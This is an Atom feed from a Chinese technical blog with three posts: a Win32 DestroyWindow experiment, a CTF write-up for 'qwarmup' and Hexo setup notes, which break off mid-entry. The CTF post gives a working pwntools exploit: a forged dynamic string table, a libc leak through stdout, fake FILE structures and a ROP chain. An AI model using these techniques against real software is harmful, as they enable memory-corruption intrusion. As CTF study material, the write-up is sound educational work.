<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>emmm&#39;s blog</title>
  
  <subtitle>这是子标题</subtitle>
  <link href="https://h4ckf0rfun.github.io/atom.xml" rel="self"/>
  
  <link href="https://h4ckf0rfun.github.io/"/>
  <updated>2022-09-05T02:16:37.786Z</updated>
  <id>https://h4ckf0rfun.github.io/</id>
  
  <author>
    <name>emmm</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DestroyWindow工作机制</title>
    <link href="https://h4ckf0rfun.github.io/2022/09/05/DestroyWindow%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/05/DestroyWindow%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6/</id>
    <published>2022-09-05T02:14:58.000Z</published>
    <updated>2022-09-05T02:16:37.786Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DestroyWindow工作机制"><a href="#DestroyWindow工作机制" class="headerlink" title="DestroyWindow工作机制"></a>DestroyWindow工作机制</h1><ol><li>猜测DestroyWindow调用时内部是直接SendMessage(WM_DESTROY)而不是PostMessage</li></ol><p>测试代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOL __stdcall <span class="title function_">DlgProc</span><span class="params">(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;DestroyWindow 开始了\n&quot;</span>);</span><br><span class="line">DestroyWindow(hWnd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;DestroyWindow 结束了\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WM_DESTROY\n&quot;</span>);</span><br><span class="line">PostQuitMessage(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">HINSTANCE hInstance = GetModuleHandle(<span class="number">0</span>);</span><br><span class="line">HWND hDlg = CreateDialog(hInstance, MAKEINTRESOURCE(IDD_DIALOG1),<span class="literal">NULL</span>, DlgProc);</span><br><span class="line">MSG msg = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">ShowWindow(hDlg, SW_SHOW);</span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (!IsDialogMessage(<span class="literal">NULL</span>,&amp;msg))&#123;</span><br><span class="line">TranslateMessage(&amp;msg);</span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行代码，然后关闭窗口，可以看到输出:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/05/DestroyWindow%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6/Untitled.png" alt="Untitled"></p><p>可以看到WM_DESTROY在DestroyWindow返回之前就被处理了。</p><ol><li>DestroyWindow返回后会清空消息队列有关的消息:</li></ol><p>示例代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOL __stdcall <span class="title function_">DlgProc</span><span class="params">(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;DestroyWindow 开始了\n&quot;</span>);</span><br><span class="line">PostMessage(hWnd, <span class="number">0x10086</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">DestroyWindow(hWnd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;DestroyWindow 结束了\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WM_DESTROY\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">MSG msg = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (msg.message == <span class="number">0x10086</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;get msg:0x10086\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">PostQuitMessage(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">HINSTANCE hInstance = GetModuleHandle(<span class="number">0</span>);</span><br><span class="line">HWND hDlg = CreateDialog(hInstance, MAKEINTRESOURCE(IDD_DIALOG1),<span class="literal">NULL</span>, DlgProc);</span><br><span class="line">MSG msg = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">ShowWindow(hDlg, SW_SHOW);</span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (!IsDialogMessage(<span class="literal">NULL</span>,&amp;msg))&#123;</span><br><span class="line">TranslateMessage(&amp;msg);</span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行代码，查看结果:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/05/DestroyWindow%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6/Untitled%201.png" alt="Untitled"></p><p>在WM_DESTROY内部可以get到DestroyWindow之前Post的Message</p><p>如果是在DestroyWindow之后再获取的话，此时窗口的资源已被释放，此时的hWnd已经是一个无效的hWnd了，而且有关该hWnd的消息都会被从消息队列移除:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/05/DestroyWindow%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6/Untitled%202.png" alt="Untitled"></p><p>可以看到，程序阻塞在了GetMessage中</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DestroyWindow工作机制&quot;&gt;&lt;a href=&quot;#DestroyWindow工作机制&quot; class=&quot;headerlink&quot; title=&quot;DestroyWindow工作机制&quot;&gt;&lt;/a&gt;DestroyWindow工作机制&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;猜测De</summary>
      
    
    
    
    <category term="Win32" scheme="https://h4ckf0rfun.github.io/categories/Win32/"/>
    
    
  </entry>
  
  <entry>
    <title>qwarmup</title>
    <link href="https://h4ckf0rfun.github.io/2022/09/04/qwarmup/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/04/qwarmup/</id>
    <published>2022-09-04T14:34:47.000Z</published>
    <updated>2022-09-04T14:35:59.393Z</updated>
    
    <content type="html"><![CDATA[<h1 id="qwarmup复现"><a href="#qwarmup复现" class="headerlink" title="qwarmup复现"></a>qwarmup复现</h1><p>(加载主程序,判断是否有动态链接器,没有的话直接转到程序入口如果有ld.so,执行ld.so的start进行动态链接)</p><h3 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a>link_map</h3><p>(位置: include&#x2F;link.h)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>&#123;</span></span><br><span class="line">uint64 l_addr;  <span class="comment">//(当前elf base)</span></span><br><span class="line">uint64 name;    <span class="comment">//(当前elf 名称)</span></span><br><span class="line">uint64 l_ld;    <span class="comment">//(当前elf 的dynamic 段地址)</span></span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在动态链接的时候会填充 link_map结构，info成员里面保存了dynamic段里面项的地址.</p><p>got[0] .dynamic,got[1] link_map(当前elf文件) ,got[2] dl_runtime_resolve</p><h3 id="dl-runtime-resolve-link-map-reloc-idx"><a href="#dl-runtime-resolve-link-map-reloc-idx" class="headerlink" title="_dl_runtime_resolve(link_map,reloc_idx):"></a>_dl_runtime_resolve(link_map,reloc_idx):</h3><p><img src="https://h4ckf0rfun.github.io/2022/09/04/qwarmup/Untitled.png" alt="Untitled"></p><p>当_dl_fixup调用完之后,got内已经被填上了正确的地址，此处有mov r11,rax，在_dl_fixup的最后直接jmp r11，而不是再从got 内取出函数地址。</p><h3 id="dl-fixup-link-map-reloc-idx"><a href="#dl-fixup-link-map-reloc-idx" class="headerlink" title="_dl_fixup(link_map,reloc_idx):"></a>_dl_fixup(link_map,reloc_idx):</h3><p><img src="https://h4ckf0rfun.github.io/2022/09/04/qwarmup/Untitled%201.png" alt="Untitled"></p><p>l_info[DT_SYMTAB]保存的是dynamic段 DT_SYMTAB的地址，而不是直接保存的symtab的地址。下面的字符串表同样是这样。</p><p><img src="https://h4ckf0rfun.github.io/2022/09/04/qwarmup/Untitled%202.png" alt="Untitled"></p><p>l_addr + offest 计算出重定位地址，貌似l_addr只有在这里使用.在找到目标符号的地址后，再把实际函数地址填充到rel_addr处。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路:"></a>攻击思路:</h3><ol><li>修改l_addr低字节解决只能写一次的问题</li><li>修改_IO_2_1_stdout的flag和write_base</li><li>修改l_info[DT_STRTAB] 的低字节，l_info[DT_STRTAB] 不是字符串表的地址，而是下面这样一个结构体的地址:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxwordd_tag;<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>其中union里面保存的才是字符串表的地址.，修改低字节使其指向的Elf64_Dyn结构内的d_val 是一个libc的地址，这样就有可能在和 write 函数字符串相同偏移处伪造一个新的字符串(函数名)，这样dl_runtime_resolve找到的 symbol_name  &#x3D; strtab(libc内) + offset 就是伪造的函数了 </p><p><img src="https://h4ckf0rfun.github.io/2022/09/04/qwarmup/Untitled%203.png" alt="Untitled"></p><p>修改低字节为 0xb8，指向的dynmaic 项的d_val刚好是个libc内的地址而且是可以写的(可以在这里伪造函数名)，接着write 调用的时候就会指向伪造的函数</p><ol><li>在第三步的libc地址 + offset 处 伪造字符串”_IO_flush_all”(需要在第三步之前写好)，然后调用write，实际上调用的是_IO_flush_all，就会leak libc了 </li><li>还原l_info[DT_STRTAB] 的低字节，(不还原的话第六步中每次都会调用_IO_flush_all会出问题)</li><li>伪造_IO_list_all，修改pointer_guard </li><li>再次修改l_info[DT_STRTAB] 的低字节，执行_IO_flush_all</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;qwarmup&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">offset,data</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        sh.send(p64(offset + i))</span><br><span class="line">        sh.send(p8(byte))</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;Success!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc_ptr</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x11</span>):</span><br><span class="line">        p = (p&lt;&lt;<span class="number">1</span>&amp;<span class="number">0xffffffffffffffff</span>) | p&gt;&gt;<span class="number">63</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">sh.send(p32(<span class="number">0x400000</span>))</span><br><span class="line">write_data(<span class="number">0x671210</span>,p8(<span class="number">0x408c</span> - <span class="number">0x4018</span> - <span class="number">4</span>))    <span class="comment">#modify low byte of l_addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc:</span></span><br><span class="line">write_data(<span class="number">0x61d750</span>,p32(<span class="number">0xfbad1800</span>))    <span class="comment">#写_IO_2_1_stdout 的write_base和flag</span></span><br><span class="line">write_data(<span class="number">0x61d770</span>,p8(<span class="number">0xc8</span>))</span><br><span class="line"></span><br><span class="line">write_data(<span class="number">0x6710f0</span> + <span class="number">0x22</span>,<span class="string">b&#x27;_IO_flush_all&#x27;</span>)   <span class="comment">#伪造字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.send(p64(<span class="number">0x671278</span>))     <span class="comment">#修改l_info[5]的低字节</span></span><br><span class="line">sh.send(p8(<span class="number">0xb8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">libc_base = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x219a80</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sh.send(p64(<span class="number">0x671278</span>))     <span class="comment">#恢复l_info[5]的低字节</span></span><br><span class="line">sh.send(p8(<span class="number">0x78</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fs_0x30</span></span><br><span class="line">write_data(<span class="number">0x62c5b0</span> + <span class="number">0x30</span>,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">rdx = libc_base - <span class="number">0x403000</span> + <span class="number">0x10</span> + <span class="number">0x4000</span></span><br><span class="line"></span><br><span class="line">fake_IO = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_IO += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">fake_IO += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_IO += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">fake_IO += p64(<span class="number">1</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_IO += p64(<span class="number">0</span>) + p64(libc_base + <span class="number">0x21ba50</span>)</span><br><span class="line">fake_IO += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_IO += p64(<span class="number">0</span>) * <span class="number">8</span></span><br><span class="line">fake_IO += p64(libc_base + <span class="number">0x215bd8</span>)   <span class="comment">##vtable</span></span><br><span class="line">fake_IO += p64(rdx)</span><br><span class="line">fake_IO += p64(enc_ptr(libc_base + <span class="number">0x0000000000165fa0</span>))</span><br><span class="line"></span><br><span class="line">write_data(<span class="number">0x0</span>,fake_IO)</span><br><span class="line">write_data(<span class="number">0x61d650</span>,p64(libc_base - <span class="number">0x403000</span> + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># 0x0000000000165fa0 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000028a87</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002a6c5</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002c081</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x000000000005f65a</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x0000000000045f10</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x911b6</span></span><br><span class="line"></span><br><span class="line">flag = rdx + <span class="number">0xc0</span> + <span class="number">0xc8</span></span><br><span class="line"></span><br><span class="line">d = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">d += p64(<span class="number">0</span>) + p64(rdx)</span><br><span class="line">d += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">d += p64(libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>) + p64(<span class="number">0</span>)</span><br><span class="line">d += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">d += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">d += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">d += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">d += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">d += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">d += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">d += p64(rdx + <span class="number">0xc0</span>) + p64(ret)</span><br><span class="line">d += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##Rop chain</span></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi) + p64(flag)</span><br><span class="line">rop += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">rop += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi) + p64(flag)</span><br><span class="line">rop += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">rop += p64(pop_rax) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi) + p64(flag)</span><br><span class="line">rop += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">rop += p64(pop_rax) + p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(syscall_ret)</span><br><span class="line">rop += <span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">d += rop</span><br><span class="line"></span><br><span class="line">write_data(<span class="number">0x4000</span>,d)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">sh.send(p64(<span class="number">0x671278</span>))    <span class="comment">#修改l_info[5]的低字节,_IO_flush_all</span></span><br><span class="line">sh.send(p8(<span class="number">0xb8</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;qwarmup复现&quot;&gt;&lt;a href=&quot;#qwarmup复现&quot; class=&quot;headerlink&quot; title=&quot;qwarmup复现&quot;&gt;&lt;/a&gt;qwarmup复现&lt;/h1&gt;&lt;p&gt;(加载主程序,判断是否有动态链接器,没有的话直接转到程序入口如果有ld.so,执行l</summary>
      
    
    
    
    <category term="CTF" scheme="https://h4ckf0rfun.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>hexo博客搭建记录</title>
    <link href="https://h4ckf0rfun.github.io/2022/09/04/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/04/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</id>
    <published>2022-09-04T14:10:50.000Z</published>
    <updated>2022-09-04T14:21:35.891Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hexo-搭建博客"><a href="#hexo-搭建博客" class="headerlink" title="hexo 搭建博客"></a>hexo 搭建博客</h1><h2 id="Start"><a href="#Start" class="headerlink" title="Start:"></a>Start:</h2><ol><li>node.js 安装</li></ol><p><a href="https://nodejs.org/en/download/">Download | Node.js (nodejs.org)</a></p><ol start="2"><li>使用npm 安装 hexo</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><ol start="3"><li>在某个目录下面初始化博客:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init blog</span><br></pre></td></tr></table></figure><ol start="4"><li>检测运行</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo new test_my_site   <span class="comment">//新添加一篇博客</span></span><br><span class="line"></span><br><span class="line">hexo g                  <span class="comment">//生成</span></span><br><span class="line"></span><br><span class="line">hexo s                  <span class="comment">//启动本地服务</span></span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令:"></a>常用命令:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g #安装Hexo</span><br><span class="line">npm update hexo -g #升级</span><br><span class="line">hexo init #初始化博客</span><br><span class="line"></span><br><span class="line">命令简写</span><br><span class="line">hexo n <span class="string">&quot;我的博客&quot;</span> == hexo new <span class="string">&quot;我的博客&quot;</span> #新建文章</span><br><span class="line">hexo g == hexo generate #生成</span><br><span class="line">hexo s == hexo server #启动服务预览</span><br><span class="line">hexo d == hexo deploy #部署</span><br><span class="line"></span><br><span class="line">hexo server #Hexo会监视文件变动并自动更新，无须重启服务器</span><br><span class="line">hexo server -s #静态模式</span><br><span class="line">hexo server -p <span class="number">5000</span> #更改端口</span><br><span class="line">hexo server -i <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> #自定义 IP</span><br><span class="line">hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令</span><br></pre></td></tr></table></figure><h3 id="推送网站"><a href="#推送网站" class="headerlink" title="推送网站"></a>推送网站</h3><ol><li>站点配置文件: &#x2F;_confing.ym</li></ol><p>需要修改repo 为自己的仓库地址(给hexo d的配置):</p><p><img src="https://h4ckf0rfun.github.io/2022/09/04/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/Untitled.png" alt="Untitled"></p><p>安装推送插件(需要在当前博客目录下面安装????):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>之后输入这三条命令：</p><figure class="highlight 